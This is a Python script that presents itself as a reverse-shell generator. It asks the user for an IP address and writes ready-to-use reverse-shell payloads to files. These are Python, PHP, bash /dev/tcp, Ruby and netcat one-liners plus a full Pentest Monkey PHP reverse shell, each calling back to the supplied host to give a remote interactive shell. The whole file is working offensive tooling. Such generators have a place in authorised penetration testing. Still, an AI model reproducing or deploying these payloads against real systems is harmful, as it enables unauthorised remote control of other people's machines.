import os
import sys

try: 
    from time import sleep
    from colorama import init, Fore, Back, Style
    from termcolor import colored  # tries to import module
except ImportError:  
    sys.exit(Fore.RED+"Please Install the required dependencies") # exits and prints the message 

def banner(): # banner 

    banner = """

██████╗░███████╗██╗░░░██╗███████╗██████╗░░██████╗███████╗  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔════╝██║░░░██║██╔════╝██╔══██╗██╔════╝██╔════╝  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██████╔╝█████╗░░╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░█████╗░░  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██╔══██╗██╔══╝░░░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██╔══╝░░  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░░██║███████╗░░╚██╔╝░░███████╗██║░░██║██████╔╝███████╗  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚══════╝  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

\t░██████╗░███████╗███╗░░██╗███████╗██████╗░░█████╗░████████╗░█████╗░██████╗░
\t██╔════╝░██╔════╝████╗░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
\t██║░░██╗░█████╗░░██╔██╗██║█████╗░░██████╔╝███████║░░░██║░░░██║░░██║██████╔╝
\t██║░░╚██╗██╔══╝░░██║╚████║██╔══╝░░██╔══██╗██╔══██║░░░██║░░░██║░░██║██╔══██╗
\t╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║░░░██║░░░╚█████╔╝██║░░██║
\t░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝    \n     
        @author: softwareuser23 
        @discription: a simple script to generate reverse shells ;)
        @message: Thank you for using my Script :)   
        @version: 1.0\n"""                                                                           
    return colored(banner,'red')
try:
        
        def choice(): # select reverse shell language
        
                inp = input(Fore.CYAN + """Select the language of shell from the below list:
                +-------------------------+
                | 1. Python (Python2)     |
                | 2. Python (Python3)     |         
                | 3. PHP (One Liner)      |
                | 4. Bash                 |
                | 5. Ruby                 |
                | 6. Netcat               |
                | 7. Php (Pentest Monkey) |
                +-------------------------+
                : """)
                msg = "Successfully saved it in a file!"
                get_ip = input(Fore.YELLOW + "[*] Please enter your IP : ")

                if inp=="1": # python2 shell
                        shell = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{get_ip}",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'"""
                        f = open('shells/shell2.py','w')
                        f.write(shell)
                        print(shell)
                
                elif inp=="2": # python3 shell
                        shell_py3= f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{get_ip}",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'
                        """
                        f = open('shells/shell3.py','w')
                        f.write(shell_py3)
                        print(shell_py3)
                        print(Fore.YELLOW+msg)

                elif inp=="3": # php shell
                        php_shell = f"""php -r '$sock=fsockopen("{get_ip}",1234);exec("/bin/sh -i <&3 >&3 2>&3");\'"""
                        f = open('shells/shell.php','w')
                        f.write(php_shell)
                        print(php_shell)
                        print(Fore.YELLOW+msg)
                
                elif inp=="4": #bash reverse shell
                        bash_shell = f"""bash -i >& /dev/tcp/{get_ip}/8080 0>&1"""
                        f = open('shells/shell.sh','w')
                        f.write(bash_shell)
                        print(bash_shell)
                        print(Fore.YELLOW+msg)
                
                elif inp=="5": # Ruby reverse shell
                        ruby_shell = f"""ruby -rsocket -e'f=TCPSocket.open("{get_ip}",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'"""
                        f = open('shells/shell.rb','w'
                        )
                        f.write(ruby_shell)
                        print(ruby_shell)
                        print(Fore.YELLOW+msg)

                elif inp=="6": # netcat reverse shell
                        netcat_shell = f"""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {get_ip} 1234 >/tmp/f"""
                        f = open('shells/shell_nc.sh','w')
                        f.write(netcat_shell)
                        print(netcat_shell)
                        print(Fore.YELLOW+msg)

                elif inp=="7": # pentest monkey reverse-shell
                        monkey_shell = open('php-rev-shell.php','w')
                        monkey_shell.write('''<?php
                        set_time_limit (0);
                        $VERSION = "1.0";
                        $ip = "'''+ get_ip + '''\";
                        $port = 1234;
                        $chunk_size = 1400;
                        $write_a = null;
                        $error_a = null;
                        $shell = 'uname -a; w; id; /bin/sh -i';
                        $daemon = 0;
                        $debug = 0;
                        if (function_exists('pcntl_fork')) {
                                // Fork and have the parent process exit
                                $pid = pcntl_fork();
                                if ($pid == -1) {
                                        printit("ERROR: Can't fork");
                                        exit(1);
                                }
                                if ($pid) {
                                        exit(0);  // Parent exits
                                }
                                if (posix_setsid() == -1) {
                                        printit("Error: Can't setsid()");
                                        exit(1);
                                }
                                $daemon = 1;
                        } else {
                                printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
                        }
                        chdir("/");
                        umask(0);
                        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
                        if (!$sock) {
                                printit("$errstr ($errno)");
                                exit(1);
                        }
                        $descriptorspec = array(
                        0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
                        1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                        2 => array("pipe", "w")   // stderr is a pipe that the child will write to
                        );
                        $process = proc_open($shell, $descriptorspec, $pipes);
                        if (!is_resource($process)) {
                                printit("ERROR: Can't spawn shell");
                                exit(1);
                        }
                        stream_set_blocking($pipes[0], 0);
                        stream_set_blocking($pipes[1], 0);
                        stream_set_blocking($pipes[2], 0);
                        stream_set_blocking($sock, 0);
                        printit("Successfully opened reverse shell to $ip:$port");
                        while (1) {
                                if (feof($sock)) {
                                        printit("ERROR: Shell connection terminated");
                                        break;
                                }
                                if (feof($pipes[1])) {
                                        printit("ERROR: Shell process terminated");
                                        break;
                                }
                                $read_a = array($sock, $pipes[1], $pipes[2]);
                                $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
                                if (in_array($sock, $read_a)) {
                                        if ($debug) printit("SOCK READ");
                                        $input = fread($sock, $chunk_size);
                                        if ($debug) printit("SOCK: $input");
                                        fwrite($pipes[0], $input);
                                }
                                if (in_array($pipes[1], $read_a)) {
                                        if ($debug) printit("STDOUT READ");
                                        $input = fread($pipes[1], $chunk_size);
                                        if ($debug) printit("STDOUT: $input");
                                        fwrite($sock, $input);
                                }
                                if (in_array($pipes[2], $read_a)) {
                                        if ($debug) printit("STDERR READ");
                                        $input = fread($pipes[2], $chunk_size);
                                        if ($debug) printit("STDERR: $input");
                                        fwrite($sock, $input);
                                }
                        }
                        fclose($sock);
                        fclose($pipes[0]);
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        proc_close($process);
                        function printit ($string) {
                                if (!$daemon) {
                                        print "$string\n";
                                }
                        }
                        ?>
                        ''')
                        print(Fore.YELLOW+msg)
                else: # invalid input
                        error_msg = f'Invalid option {inp}'
                        print(Fore.RED+error_msg) 

        def re_run_(): # function to re run the program
                sleep(2.4)
                ask = input(Fore.YELLOW + "[*] Do you want to re-run the program?(y/n) : ")
                if ask == 'y':
                        choice()
                else:            
                        sys.exit(Fore.RED+'Thank You for using My Script! :)')

except KeyboardInterrupt:
        sys.exit(0)



print(banner())
choice()
re_run_()
